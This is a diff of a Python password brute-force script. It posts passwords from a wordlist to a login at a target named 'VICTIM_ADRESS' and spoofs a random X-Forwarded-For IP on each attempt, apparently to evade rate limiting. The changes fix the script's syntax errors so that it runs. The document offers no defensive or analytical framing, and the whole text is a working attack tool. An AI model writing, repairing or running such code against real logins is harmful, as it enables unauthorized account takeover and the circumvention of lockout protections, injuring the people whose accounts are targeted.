@@ -1,14 +1,14 @@
 import requests
 import random
-TARGET="VICTIM_EMAIL"
+TARGET="VICTIM_ADRESS"
 PASSWORD_FILE="..."
 EMAIL="..."
 TIMEOUT=10
 def rand_ip():
         return "{}.{}.{}.{}".format(random.randint(1,254), random.randint(1,254), random.randint(1,254), random.randint(1,254))
-session requests. Session()
+session = requests.Session()
 
-session.headers.update({"User-Agent":"..."})
+session.headers.update({"User-Agent":"USER_AGENT"})
 
 with open (PASSWORD_FILE, "r", encoding="utf-8", errors="ignore") as fh:
         for i, line in enumerate(fh,start=1):
@@ -17,14 +17,15 @@ with open (PASSWORD_FILE, "r", encoding="utf-8", errors="ignore") as fh:
                         continue
                 ip=rand_ip()
                 headers={"X-Forwarded-For": ip}
-                data {"email": EMAIL, "password": pwd)
+                data =  {"email": EMAIL, "password": pwd}
                 
                 try:
-                      r=session.post(XARGET, data=data, headers=headers,timeout=TIMEOUT,allow_redirects=True)
-                      status r.status_code
+                      r = session.post(TARGET, data=data, headers=headers,timeout=TIMEOUT,allow_redirects=True)
+                      status = r.status_code
                       length=len(r.content)
                       print(pwd)
                       print(status)
                       print(length)
-                except requests. RequestException as e:
+                except requests.RequestException as e:
                         print(e)
+
